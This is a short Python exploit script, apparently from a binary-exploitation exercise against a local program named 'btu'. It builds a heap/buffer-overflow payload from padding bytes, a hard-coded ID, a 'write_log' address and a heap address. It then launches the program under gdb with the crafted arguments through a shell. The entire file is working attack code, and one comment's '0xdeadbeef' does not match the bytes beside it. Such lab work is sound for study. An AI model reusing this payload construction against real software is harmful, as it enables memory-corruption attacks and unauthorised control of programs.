#!/usr/bin/env python3

import subprocess
# build the payload of last task same as this.

# Define payload components
passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
idBuff = b'\xff\x1c\x45\x6a'                # Klaus ID
targetAddr = b'\x30\x0d\x05\x08'            # write_log address
heapAddr = b'\xa0\x7d\x05\x08'              # heap address



# Full password payload
passPayload = passwordBuff + idBuff + targetAddr + heapAddr

# Function to convert bytes to a Python byte-escaped string
def to_python_bytestr(b: bytes) -> str:
    return ''.join(f'\\x{byte:02x}' for byte in b)

# Convert to python3-compatible command line string
pass_py_str = to_python_bytestr(passPayload)

# creating exmatriculate
exmatriculateBuff = b'\x02\xb2\x04\x08'              # 0xdeadbeef -> to be placed in the target address
name_py_str = to_python_bytestr(exmatriculateBuff)

# Build GDB command using python3 -c for both args
gdb_cmd = (
    "gdb --args ./build/bin/btu add Abdelaziz "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
    " 5555 "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
)

# Print and execute
print("[+] Running:")
print(gdb_cmd)
subprocess.run(gdb_cmd, shell=True)
